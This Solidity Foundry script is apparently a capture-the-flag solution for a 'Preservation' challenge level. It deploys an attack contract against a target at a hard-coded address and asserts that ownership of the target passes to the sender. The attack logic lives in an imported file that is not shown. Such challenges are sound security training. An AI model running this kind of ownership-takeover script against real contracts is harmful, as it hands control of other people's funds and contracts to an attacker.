// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import { PreservationSolution} from "src/16_Preservation/PreservationSolution.sol";
import { Preservation } from "src/16_Preservation/Preservation.sol";

contract PreservationScript is Script {

    PreservationSolution preservationSolution;
    Preservation preservationProd;
    address oldOwner;


    function setUp() public {
        preservationProd = Preservation(0x03635126180422206b36e8aaAfFbcC7B91993be5);
    }

    function run() public {
        oldOwner = preservationProd.owner();
        assert(oldOwner != address(0));

        vm.startBroadcast();
        preservationSolution = new PreservationSolution();
        preservationSolution.changeOwner(address(preservationProd));
        vm.stopBroadcast();

        assert(preservationProd.owner() == tx.origin);
    }

}
